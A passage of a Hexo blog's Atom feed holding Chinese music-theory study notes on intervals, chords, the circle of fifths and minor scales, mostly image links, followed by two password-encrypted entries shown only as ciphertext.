id="稳定音"><a href="#稳定音" class="headerlink" title="稳定音"></a>稳定音</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303233249966.png"></p><h2 id="音的倾向性"><a href="#音的倾向性" class="headerlink" title="音的倾向性"></a>音的倾向性</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303233423520.png"></p><h1 id="音程"><a href="#音程" class="headerlink" title="音程"></a>音程</h1><h2 id="半音"><a href="#半音" class="headerlink" title="半音"></a>半音</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">从0开始数</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303234010598.png"></p><h2 id="度数"><a href="#度数" class="headerlink" title="度数"></a>度数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">从1开始数</span><br><span class="line">度数 &#x3D; 白键数 ， 大小度为区分同度数内的半音数多少</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303234253799.png"></p><h2 id="转位三要素"><a href="#转位三要素" class="headerlink" title="转位三要素"></a>转位三要素</h2><h3 id="度数相加等于九"><a href="#度数相加等于九" class="headerlink" title="度数相加等于九"></a>度数相加等于九</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303235952831.png"></p><h3 id="大小、增减是互换"><a href="#大小、增减是互换" class="headerlink" title="大小、增减是互换"></a>大小、增减是互换</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303235514205.png"></p><h3 id="纯音程不变"><a href="#纯音程不变" class="headerlink" title="纯音程不变"></a>纯音程不变</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210303235848223.png"></p><h2 id="协和音程"><a href="#协和音程" class="headerlink" title="协和音程"></a>协和音程</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304000124238.png"></p><h1 id="和弦"><a href="#和弦" class="headerlink" title="和弦"></a>和弦</h1><h2 id="三和弦"><a href="#三和弦" class="headerlink" title="三和弦"></a>三和弦</h2><p>三度叠置</p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304000952158.png"></p><h3 id="大三和弦"><a href="#大三和弦" class="headerlink" title="大三和弦"></a>大三和弦</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304000434518.png"></p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304000525111.png"></p><h3 id="小三和弦"><a href="#小三和弦" class="headerlink" title="小三和弦"></a>小三和弦</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304000554989.png"></p><h3 id="减三和弦"><a href="#减三和弦" class="headerlink" title="减三和弦"></a>减三和弦</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304000752501.png"></p><h3 id="三和弦转位"><a href="#三和弦转位" class="headerlink" title="三和弦转位"></a>三和弦转位</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304001114764.png"></p><h2 id="七和弦"><a href="#七和弦" class="headerlink" title="七和弦"></a>七和弦</h2><h3 id="大七和弦"><a href="#大七和弦" class="headerlink" title="大七和弦"></a>大七和弦</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">大三和弦+大七度</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304001234499.png"></p><h3 id="小七和弦"><a href="#小七和弦" class="headerlink" title="小七和弦"></a>小七和弦</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小三和弦+小七度</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304001315440.png"></p><h3 id="属七和弦"><a href="#属七和弦" class="headerlink" title="属七和弦"></a>属七和弦</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">大三和弦+小七度</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304001600305.png"></p><h3 id="小大七和弦"><a href="#小大七和弦" class="headerlink" title="小大七和弦"></a>小大七和弦</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小三和弦+大七度</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304001624745.png"></p><h3 id="七和弦转位"><a href="#七和弦转位" class="headerlink" title="七和弦转位"></a>七和弦转位</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304001751774.png"></p><h1 id="五度循环圈"><a href="#五度循环圈" class="headerlink" title="五度循环圈"></a>五度循环圈</h1><h2 id="五度循环圈-1"><a href="#五度循环圈-1" class="headerlink" title="五度循环圈"></a>五度循环圈</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">和声连接、调的关系、深入理解音程、即兴演奏</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304002503404.png"></p><h1 id="调式中各音级的名称"><a href="#调式中各音级的名称" class="headerlink" title="调式中各音级的名称"></a>调式中各音级的名称</h1><h2 id="调式中各音级的名称-1"><a href="#调式中各音级的名称-1" class="headerlink" title="调式中各音级的名称"></a>调式中各音级的名称</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304002700025.png"></p><h1 id="自然小调"><a href="#自然小调" class="headerlink" title="自然小调"></a>自然小调</h1><p>大调欢快，小调悲伤</p><h2 id="自然小调-1"><a href="#自然小调-1" class="headerlink" title="自然小调"></a>自然小调</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304003001471.png"></p><h3 id="例：a小调"><a href="#例：a小调" class="headerlink" title="例：a小调"></a>例：a小调</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304003049655.png"></p><h1 id="关系大小调"><a href="#关系大小调" class="headerlink" title="关系大小调"></a>关系大小调</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C大调是a小调的关系大调，a小调是C大调关系小调。</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304003230348.png"></p><h2 id="关系图"><a href="#关系图" class="headerlink" title="关系图"></a>关系图</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304003422436.png"></p><h1 id="音程度数"><a href="#音程度数" class="headerlink" title="音程度数"></a>音程度数</h1><h2 id="音程度数判断"><a href="#音程度数判断" class="headerlink" title="音程度数判断"></a>音程度数判断</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304003638090.png"></p><h2 id="写和弦构成音"><a href="#写和弦构成音" class="headerlink" title="写和弦构成音"></a>写和弦构成音</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304003908677.png"></p><h2 id="写音阶构成因"><a href="#写音阶构成因" class="headerlink" title="写音阶构成因"></a>写音阶构成因</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304004037120.png"></p><h1 id="自然音程与变化音程"><a href="#自然音程与变化音程" class="headerlink" title="自然音程与变化音程"></a>自然音程与变化音程</h1><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304005010593.png"></p><h2 id="自然音程"><a href="#自然音程" class="headerlink" title="自然音程"></a>自然音程</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304004207142.png"></p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304004410491.png"></p><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304004316257.png"></p><h2 id="变化音程"><a href="#变化音程" class="headerlink" title="变化音程"></a>变化音程</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304004502910.png"></p><h3 id="增音程"><a href="#增音程" class="headerlink" title="增音程"></a>增音程</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304004629563.png"></p><h3 id="减音程"><a href="#减音程" class="headerlink" title="减音程"></a>减音程</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304004658655.png"></p><h3 id="倍增音程"><a href="#倍增音程" class="headerlink" title="倍增音程"></a>倍增音程</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304004809942.png"></p><h3 id="倍减音程"><a href="#倍减音程" class="headerlink" title="倍减音程"></a>倍减音程</h3><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304004840148.png"></p><h1 id="小调的变体"><a href="#小调的变体" class="headerlink" title="小调的变体"></a>小调的变体</h1><h2 id="和声小调、旋律小调"><a href="#和声小调、旋律小调" class="headerlink" title="和声小调、旋律小调"></a>和声小调、旋律小调</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304005231210.png"></p><h2 id="三种小调和大调的关系"><a href="#三种小调和大调的关系" class="headerlink" title="三种小调和大调的关系"></a>三种小调和大调的关系</h2><p><img src="https://gitee.com/r00tSe7en/pictures/raw/master/2021.03.04/image-20210304005329719.png"></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;乐理基础学习笔记。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="生活随笔" scheme="https://www.se7ensec.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="乐理基础" scheme="https://www.se7ensec.cn/tags/%E4%B9%90%E7%90%86%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>2020年度总结</title>
    <link href="https://www.se7ensec.cn/2021/01/30/2020%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <id>https://www.se7ensec.cn/2021/01/30/2020%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</id>
    <published>2021-01-29T17:16:18.000Z</published>
    <updated>2021-09-27T11:33:05.795Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="cb11856a4897e7fc052c442efe3fc22364a64b10146d15984104d66e27290427">ff41d9ed7da0c90bb8315e296c2afdc7e5ee23f1c3e49d2449c84df883ef80e7f3e4ffff36be0b9a51ad072802f294a5efd4fd268166a5cba83ce0fce882680f287ddb4c54b0c4532a7ddcad5eb9c573c6bb64efaafb02562e9ffcf4522630252c90aad4047d37775cae6601b1885e2e76878db60da51a9303fe5b8268540fbfa5e4a3a8a3805ab3bb63d08e17704a1278825317c0dec3dbfa14349fe6f85bff1485d90b6fc07f2a61de713404035785efb9df37b52df0c88d0efc9f8fdfe7ecdf88d3c065b601a2c9744a2d98ed93717e83ed2802139b43db8613911049b8b1fd82bfc9abdc4e3ac70a70479c1d3f7375d80a846e23e33209fc02fb1dedad7981b4d84c2e708ba44739b17eb730180e1d61de840633cb7839fd4ed55c2b2757247b596428d235357dbedce6a2d539da9dfc46278590a6f1fdc0752da647093e9efb91ce7244fa4c575992be05c7314d3aadabb273fa2751c137d6ea2e7976b17f3406d92d7fa7f73e9e2523029f20e51dcbb992a7169d904cc0b285326dc32eb47c71c92f0bccbd38392e3ee3168de2502a845e9ae080f0e404ffa46dadc767133d5dbf17ddd9d47b88d50c301e578c54b48c413471caa35bd0ca211cd476677efd16ca064b40a2a655ccc2977d70cb7489f67d92c2ba2032889f9d5e03eec14d8e4b4d43ccea49c948aad45cf77cfa4e793006b5fae55547f2cbdcbb362042219ba9f55bb419500d393aeb957652a88fe0d9a61bd6bbc353e50ba81dbf6291379ee628ef5000d494dd13a31a9c13a05e3a5b3455b2fdae2990eca457bcfacb0abd79b10a42a5b686b5e85f1586fe691658c9a43a10dc41120131ec4794f1896f0ab7a00041b13b61966d0b381729515b4d3d77c1c11a6e8728f43e3821796cd5679eeef0ede6b94a3e71eeeb13838773802d1b7660eacc64bdc026e428674b5b9d31ed2e994fba587e0604260adb65d80ae325eae422ac0b3fe4da4f5dacea2911226080c1cb5279acaa48c1a050b580dc63c539b409962bb869b75d3386bba230a24033ccbcc9ed3ea9d65dc4fe54e37bb1596fc5f2853dbec77670110375f52f974c2c3015cc62d10aaec01e1b286c60da8abe59040ea2631b50e131cf2b86c4a0636f47719931b21a5288d7d63b24250d9f72da67890b6f5f0f15efc7fb14580b10c9f88676846df8a83db5a5bdfa0242d486a1c84b5160b7e4a6f4f3b31eed7405f4c7f4fea6c32816cbc24adacf63d8ade469219cdd109167ca5597fe80ea37b979a507f02523082a508812f1604772c85e1b8c94acd6d35a8b963a34d4d83c82b9e97d6f0cc110de131106ac70a35118221d852a3c75029c3c683176c2fe4d50d9880a0d71a1cdb66d88f5a0bf145865a9905d44fc7530ae84685f6341be31e3587e965351bb4745f746d305d0e91d24febcaf91a68f7ef698be7e27fbd71881a28ba906a2df5501aa1de2a88cec459bc0aadc1c3ce83e612030d3b0f48677eddfaf738fd9559835ad7e1702aa048502935c25aedfb043a8b160284325e11ad8b8b401f8bc03b0e5fb4d155ce4a6219f7dff1007a8e2402c642baaa5d1b73bc04cd4d8760b296b30c37982df47fbd594f2f8dbaf3d8a84d0df96210ac0d5161854c8c98c05e33eb0879308cfee0937d477e121326e00b0d210c592610d7c448eeaf9a427bb52d42b164c6fff37ec24bbe43064ce6a406c492675d0c30c748810198b36290a63ddfcf847a3e231a7d268cf44f9cec3005ebed3178f5e</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="生活随笔" scheme="https://www.se7ensec.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="随想" scheme="https://www.se7ensec.cn/tags/%E9%9A%8F%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>一星期实战总结（四）</title>
    <link href="https://www.se7ensec.cn/2020/11/17/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%934/"/>
    <id>https://www.se7ensec.cn/2020/11/17/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%934/</id>
    <published>2020-11-17T02:30:24.000Z</published>
    <updated>2021-06-19T09:13:22.116Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="9ffb4db8a356ec55a75a6728349685c159ad1a2f40e3f83ca045a2edad5d9b36">79368b25fc99414eb5e6dd35b8823418ba9f2b00aaf622961808809d1588f3fb4d5201407f02b9e2c3d007f1b7bf65977da4dd88e5240cef21dd34abb8fae99f0a8d9d28711e46239440271eb8061870b69e54f553aac97172c643e36c05dede807be2f5915d1b3b2feae3a562b3f2800638d51031f6d854527c33ddc6826346bc5b81a3cd8125e794b23758fce2b899d40584d3c6894da116de3d76adb605717bd0ef6280430261869d0bd38b4a11ed62d782f73b99b51a91172b0db846fbf09974c256001885cf118dd65686890048cc9cfe005385556623d5c0f21b5b56621821d9c40126cbc722381db6ac77c4e7551a45bd326b5ca1c7f7972830c0cba577c61b1a1f20d692d354210e4e412b4e8dfb0fc623df5003e9e36209ffddb6e694b21f4704b919d77b677b6a25d829c9ad215121e4c4bddaacbbb4c0ac0a92da82b06eb06755e3e008f3d6cca47436dc6d2e228a6450d37b398e7dd0e681d07d26011294b85db2cdda3888d03d8ed02a35847d93744f4682ef24fec73f5b8b5e3ef78b74685d80d4822aca0eec472d498a094ed3ad9e4fe4539a05b53e5230e662aa9bbc141dffde2786436294ee69aaccde0b3abdc3c54eeda9fae3613421da705b207e41802d688ad75e7b9d6a458d50a89f4f4017a0be557025b43fd80cb758de19300713255baee39a2605056a721cc292b8ccae57f4ca8d1d381a6d9659ee8c8759e4f699b40cf14aed429e0b38ab30e57346f21e6d677f04be503f71e8e17addaa5e5d727901f31d95993d4a31e6dfb62f523278aee142f602f04fda3bf300eaf5b22bd2acd65a582d9aea8b7b6aa539a9289209a3c83ad9da2bcb7fe0b9e2ffc249cf587601c12e54c8e265a780373af4d876a2d891af478865a3dde5cab4c1dbf73ead626f88688730fa7c84138309354893fb3b7b243b7658c5ef4e468cf3b33da74ee2e606c5947117c0ac11aae4ee8caed135e3847bdecb2a6162bfdee647ea008b5f689cf570071d43eb3c1b89af9c42dbd0e22b521d7157d2637f6d0e694fc517eb0547cddf1b6b2ab75ab3e9d4bd2f1b28bb11a32e6473f185081db5ea44d94cb221a6bdf4184ad55c13dd8e2bc2e41fb007d868eea7c8f130c50a0a73a2c9584816338fe7b8633bb360bb6daeb2b7613fb91e35047336c0743989e7e60404a767715438f3244343a54cac59dd6fa1c6a7165e7659c4e0019755b2e962f60bfe6bb622356ae0af10ea7663825bf622367054973aa0d7882a7144127bf92a1a5648777d9018ec1884612a25b3df224bebe13b47324e383c958f1bba82bb4f686796440ad81ea0445f454ba45192027d2684546b1794f5ac1d9ec236d7f828da58d5dce9370f7eb559e9da9e7631e45a4a4aec2f2b5d2be5a53d0b8e0ca300c1166e26688256959a24309eaf7643eab9b0eadb33c7a5120ad253b6819c8bc40ea4e10e4eeb5dd359bce335b6b9b5b16ca73606c75778ca7b8cb3e84e1fab42716e40114ab04d7f7b3635e6f3a25267132b9c10242c1b596534526f90e45d8a80cfb74aed4926c60c52956a7577c6ae78a0a4d888dcea24d1a5771bf0d9bc887d8f977ebfb9e2c5327643dd01b98faa86b54e14e18ceeaa68cecf410a15a98ddea64d6d738962e027b831ee6bdedc78b8e9569063b9fdce1d5ce88a81008b7891ac6881a4626d0c135a30cc4a945eb035c75e867e0436cf420370f364dcbe0130c239623f5794efb4cea5b2b1ba022931e60464e637a0e7daf3dccddcd586b97eff469e743296604bf6fe289fa76c280347807fceb45fc0ac11306bbcbabfba677f23f9ee8c7efc92248b8937d7e5138777a4668b84526e7055f6dc3acec21a6c98bbff96e115b3855161607821132ceaf85a22094094681a7edcf097b8bd09c01886a759886f55c3b366908bfbdd43997259de9ba909ff2f3355ee47ad6127b2b3bba31ce2224f33528e033fb5392cb9da008b5f3ba21737210ca2cef5c15e29360ab5be0eaae3a3a6a4df402684af557392f33047fab1d79e13d29f76a630eef8525cd8ccd79c9002fde940480262cb35cffb7b3af5cf523c93bdcb634271eb8fffd1602008dc59d7ee6d8806446966f0b320b5a963e733d5c4a800260a6b4963ab5131c187ad383cd50fa16df960dda211c1d64ca01a277064991252d3db5adc0d4866b893195d268491f9b9a9b9a7a6f73a860c68c3003a9ba88ce30467afee0fa5c566f0144e0c2910d7838405638dd1ec1eb1d8ada25adb52ef3078ab5c28ec145cc9378c9f3968f4917476b581b2f94baa0bcc3d1fca2fe0f97c2afd8f30aff5ff7fdf35fab81729aab71a4d366af5127f67f2ce0072120da8cef81cf9ae7bc3e87c1b6abbfbe1810591bf81b33f1b9c8935118372b21f59bfe13f30591a9105420f0e214eb95ddadd938bb24ec71124aa73c9dcd73bb9b67619ea857347d5effca25050a60f2559a1e47952b2e01b7ce0c30a9f9258002ac98497257c5f12d482c8c7497bcb1161df20930428cadd42d33d99e34d7431a205a0e801320a29f1e4e374c61a07e95c66ee70b5b95b591b6a0828304e86078a1b8bf3ff00d6a6bdfb9dfe272ce37c533c9a22b28a1013ad35b6658231382165231dae7c0e014ed9133f8bd777f1f40cb01d7d2daffd0db6e0b14ae49b11f83a62cabcded34a2062b83ea603e57afbaa214a8f501b5ef259157e82cb27e61e91158ff9f3560a6556f5b6bfc2b08c8e6010666ba56b1bedb81ec564e69daf35f968a3f78035b9923c133a13334829c727012e735ec616d42c531826296c279f196193c9ea70d5becb9e28c11e590a26b059129c3ed0ae889a903b847cb43467f54b3378385ce3f1f788cc5b407a3749ba4adb81470427f18a4af503156e56095fd297a44cff32db7d05bd351b3dba528374319df030e48fdc2485408e4a2744314249f1c08feb1790623c95c96885c41a3810a1ef195e876a3056cb707e18977ba823633a56aebca1025130f46f06b17bc8181b4fc532082f7b5c64c3f037b85535a28a81423b4802115f27ee2f3a58d92c763526ce37ea20ea7b157b15bd82c18caa58ae668480c4d758b958f5be69c42d311971d243e1250919a4ef0424032b2575574ac9c409c800953d44edd01a45a61c77a421523da215a2831ab8748ad766a05800c65e10815cf883b77e777cfe0fe1c6e2410ebee9947589a25260fc353490a7482e44a94433ee7dea9b0644dd3dd3bd495934b76aa60da9d078fff2a7f84d0b1dbaed49bf5dff109290291db8d7b380544a7bfc889fc23e13ede7e59b695ac53325d84be70005bbffe4f00e90ec4b5b4bd9be1420f514c38bc64a730133b7734c4d2841442dffb7a4f06cf5ecd03a85baaca646f63b7971cbca71aa22b0dbda7b0510123af935591fd222a329fc7099b8bb864898a09e0b68e0faf15a9fa5f4d3fcd4dafcfa5b5453d73c4591137331297a2579c0252aab7da788fbf897a8554b94b916633c2888ea50a7a75f23f731f0e2bb42318269416c67a76bd84fecbc6fe84a7319710d7ac4c082e60060303771653e0f3cecef1651db4fdefaa9dbe89a824c5df05914b394626623b42cda3d2b346a01e386d6beb5b07cf4690fdc410924f0dd68edc7f5244747ca7f4ebbb61fd470c13a6038282da54be34e7843972bfc6169055523bd7332faed44a737e65c38e0b55f9a38c8b9063a03a400cb49def45b06a505011ff17093da17950f07e59cd915f0810788017f2ab726185ec4ae9ffde7662f3b2dc2f1318399ed1bab3eeb16ca604dd500923d11b671e38efcbdfb294c70f7e37abef0cb757881dbdf6262b28810408f14ba6e119c26d5d3fe32356537f1687b5e04ad2f75f6b33ed9f3395718c5b871c8a2e54e286775346c163cee4c3b96e789bb21b4799c02afb9c1494e69d5ef8507709f927d04a5a33362ed9efe2e61f2d6ae69c1fdc865457ec6154106a6ed6c1ae92fcb25de7d0d782dc9e47424cf05644f5c52c100071f5fbd862cde6dab8812f188a4accc4147ee25bf38d9b13b51072a7b6574aab2036a0fcf9c16c08656d832cbea696ea142e1a2a5056498b9aba326869ba689cf69f48d96844b366dc6ce57c18b6bf451eb79ab8ae53c0c5d537f9d38a2cf75b9799dfa652af8be03c7b9d6e9c3e9160600a44aadac7a255378d227eb8e29526efec637eaf0a70675df52b9d4b84439d49fca922618e16afd646d1b26b62c0d121cb0e2943bd36f0a7176eeb82ad33032678ac251a5e9f788ea4b6d2b0fe4e1babd918850ad4f5d5ce5d4089c6dbcb09bc42c25596ae329270e44e7242f88860d3957b552d8651697e8cf0a5b2d6c328c9d61c665c3a15b3742296cb25ebae4be9d089a19c89a83629b042684679a1b6260f6c1026666718be8c94cbcb4b9a23cbcecb31ecc477d97941d6e6b06dbbb7652d3465d91fd658ed7fa56eb0811017163343fe42e99b14c3c60b5c816bc85e3283bea748be0beab3d4463135a4e850005e43fdfffc8eac5256c6f868557eb72ef60dc56eb04bdec819cb0a5e8310a598c9815a3afb559528fd4abc5424b203305eca2a0a9af5a7da9f17a6d6a26d222bac8d3997459e7308cc97c71d88cd549555b8bb17dbc7a4ca121aefb7c76ba0c8b86142f6e2d136bb87c1cdab2e4eb1319c28552beb0bdc2d2b165786c51beec2d6d1deaee98dad84ddd704ec2c52f77b1ad6c9d7ba08b5e6a7556abb22142fb8af36540a7543bf0e2b6fb097c74de8e0ca005d95e34afe7f9d144f5c8f8e181c1d1ed10778f152c3b3ebb73134c76e9dc27b150adef142c01c14e2457617daa6bf6c55605590e6368255ba1bfc27c2b11be42c9e137c8983a3d75d7f938467ec95612dfbb283abf92607f0a2f65eb2ee2b991d9e40532558188910baf021e548ee51c5f67eab10ff4ef257c4c543776beb5c00eb2845c06a1041115cad95391aaecefff46780301e2f822941af8987e7ecda135c735ae5de3edc2dba9d839fe937361afac5885a451e966a61fe4f6651b1d798f1c93d339c02ca3b7d0b1afcf9098220258ef480cf42b22ead6dd4f876f86215e9e6ed202402bc9e27a531b370a62ac07703dfe2cf7b6e599c1c570de0c71da97f8a2897d6de419e3e804069a54d7b53cd2812ad8d6e8eff90064fd7922bd2abd018d36599aa134666feb2c157d4bf1fd7ee4b4d1656958560994204058830824b3075c4dcc29043fc5524c5d5046633a30d8b5f3817df70fec2e2c140ca430a9cfcb0c8ede32b233260df98cdc9dc7d0b670924659633bed67959f7812c11711d746454670eec3e770d06bf1355fbb7153705314511c2b12cc003e2c1eb4d519f9cedfed9c367beecc1106945492eb51f69fc5b2efd69028a1999b478b750c8b09f0e2fa25a4ba2872fd801b87e3a64ae6503f2a0c6bc350c150e7a52b05589f44cfee0532231f4fb6266242f975ae39a3868513f6dc1699ea953be21254f1ebc38be75f66b3f3a782e3aa07646005bb570dfd57ac11b01ad620e2b0564f70f42cc761ddecfefb10166a1261f3d95e01c3b8ed85d7d48b4d3b241eafc9b556c08746e09879dafbba846f7ba410681463fd4ab2ef2bb11b7aed26bd3d3365191739be6b40c6592828f5f947ce237430029e73d721105ccdcab140b53c930aea97f58da211679d2ef44efaba464b03a9b759a491db41039a487e0ec8dcebc2eac724fa084401b14312c28c68c9c71bb19d2ac9262b5b4b5dbdf96c288d33bf619968d2df42f0708dd0925d1cb720874c56a49f8f9bac02f0f1b6dfdcf26b2795ee520b3cc72b6f6865458b5096dec29bdd1afea5cc56e0f55f9c40df576ffa0a82e8ea18354a456dd149933dafa57ceab3d910e99786210e03ac4f67fa2c338d96319424f0cff24fb95f16df386fd9874e3fda0d9845304a1edf52b3f786c63b6c9c2dd16fa32c8ebb30160ada1554bb5207c0750d2befb0addb0d55b15a8b5350c65fe82d6195dba0d21237450a37d4e809be47b750d5278e716ed9cbda651d8f6157ff7caa55ef60212d08f737a6f1d601bad7f499205baf397a03c87865f7c690ff318acd234c47d6ada77d3095dd93bb6035d60080f0024e46070c69fc36c744db98e021aff541a131d241420d8ade117b2617c818b7734df971633b0b97bc3f32ee761c2a36ea947e194abbc107f4ee0d2cd31dbc4c8e34fc55ecc8ceab2c95b298a28b1c8ee6abc54add2287b0201e00daf24b5062d25cbba80b12e97550637eb2a9ea37678109758ea8c67d0d653f2dd4ad24ffc67d2479ab7acff452dddc6734076af2d0ec0803e0d2fa4d62436b17a645a6aebe8b7996e2e917cd11dc33b770f4ed8f791b5039230ad02aaa98a0f7d641525d0f463cf4dd46525112051cb5d184f12abaf124317596231ffd1b970a2f373bc2332088b3e94cca001e51727f12e0b93500944a43c5bc5627ff3e7fda87f0b2badfdacdac608b3b084e2b27c5bf14d7d3c458ad68a2d0021f061b7bb1a9814405d6e9b01a07cb826821ac285d3d7074d5aa9192bec464d2ef440f6f5c4943a6ebd9fb6c1f65983d55c71c25f83b69751f63aa713385b0a744ee75a997ddc09fd02a8f2745e0e9ea00fc9b54f736d1ba834581da4675765320b170b026dea66a3c026115f54e54c214008e5e760ce9c206bdcea20ba185caccd38eabd06d8bf431d571d8572c3f400003dd12c6355a57215725d6de60bc4f42961765e6a08fe09634bba314c088e78847c1e6d3297941f4f770ae101c90b0f022a784e6a7fa63f96dabf672ae40c1ecf2bc67f6e48ae165da7339b75053d839eb5b4669b80f3791547cf8b5db8d638dd20ef93fb2e22c0109167fc99433aa7c007da9beab693828d82c98f3cf9d20727a04094c1c8e24096fad92a84cd302b0d1f6c7f26d712f16e687ea924f09eb60a9a9e3bcd23b1d1fc94b0163590f898e7250821fa3f0ac1759331323230955f8b5dc56e9a1b14df637da2dab4f7f10e30aa297ea8b983a8392450a838468f84f9b83a43ca3bf805f11e79cb73eb87c0c17981fbe50c1d56dcc1c4fb632fd4cbc311edc59c0f06d08ce5e215fd627921cbf43c577a5bfe57391ccd26338009bb1968d71bd0a9f5b2181beff44e979d986900f781dfa56ca6624af8ee237c89e08090f22ec3ca315d90f1f68bc5eac77c7df202290945b3d154e387a29bb5fd6164e69b828f71fe5e9c30d12f644a3b4b95b04c72d406ab9bd9fd06d212c269c37408e0232bfee9433f6b022b9dd140ab8e97ac671f18fcbf69dc07b89e6806ce156878204a84fa35edf63bfe7751b2ce100707073bbdb784cfc2f778ebf919af69919cd93da6e1ddff362176e79420766908717ba7c499fb0ecaa5221e647c3ed6f7717d3144915f4181eb67dbfe59f53876ec692e69c63d7a8b70c6ba90b8ea80e5b44001d11580ac59755a9aac2ecfc3e2367329939521e64e530fad6100ee2089d012cf8083ceb63142cb67917b7c1069b0588d4511098a89de439053ae6cf6dc09d755a8ed9e4c578ed6ecf391953081fc9cf0bd4ef7e58d1572306181a5554b8f15929fb49f7303a146ae570b3f9e2c411c75ec55ed